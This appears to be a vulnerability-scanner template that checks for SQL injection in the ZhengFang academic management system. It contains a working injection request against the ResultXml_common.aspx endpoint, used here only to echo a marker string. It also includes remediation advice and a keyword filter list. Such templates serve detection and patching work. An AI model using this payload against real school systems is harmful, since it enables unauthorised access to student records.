id: demo
info:
  name: demo
  author:
  - 折跃
  description: |-
    ZhengFang academic management system SQL injection
    With training, operation, safeguard, and monitoring as the main line, the ZhengFang academic management system superimposes transactional management and strategic management of academic work, meeting the strategic needs of schools such as training process management, teaching quality inspection, teaching work evaluation, teaching performance evaluation, and teaching reform and development.

    The ZhengFang academic management system of Zhengfang Software Co., Ltd. has an SQL injection vulnerability. Attackers can exploit it to reset or obtain sensitive information.
  reference:
  - ""
  severity: high
  remediation: |
    Official remedy:
    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
    http://www.zfsoft.com/
    Temporary remedy:
    1. Use prepared statements. When using PDO, be careful not to concatenate variables directly into PDO statements. All query statements should use the parameterized query interface provided by the database; parameterized statements use parameters instead of embedding user input variables into SQL statements. Currently almost all database systems provide a parameterized SQL statement execution interface, which can very effectively prevent SQL injection attacks.
    2. Escape or encode special characters entering the database (such as '"<>&*; etc.).
    3. Confirm the type of each data item; for example, numeric data must be numeric, and the corresponding database storage field must be of int type.
    4. Strictly limit data length, which can to some extent prevent longer SQL injection statements from executing correctly.
    5. Unify the encoding across every data layer of the website; it is recommended to use UTF-8 throughout, since inconsistent encoding between layers may allow some filtering models to be bypassed.
    6. Strictly restrict the database operation privileges of website users, giving each user only the minimum privileges needed for their work, thereby minimizing the harm of injection attacks to the database.
    7. Avoid displaying SQL error information on the website, such as type errors or field mismatches, to prevent attackers from using this error information for further judgment.
    8. Filter dangerous characters; for example, use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if a match is found.
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==200
    - contains(body,'098f6bcd4621d3')
  raw:
  - |
    GET /ResultXml_common.aspx?k=%&column=%27[test=%27||CHR(48)||CHR(57)||CHR(56)||CHR(102)||CHR(54)||CHR(98)||CHR(99)||CHR(100)||CHR(52)||CHR(54)||CHR(50)||CHR(49)||CHR(100)||CHR(51)||%27]%27&table=xsjbxxb+where+rownum<=10-- HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
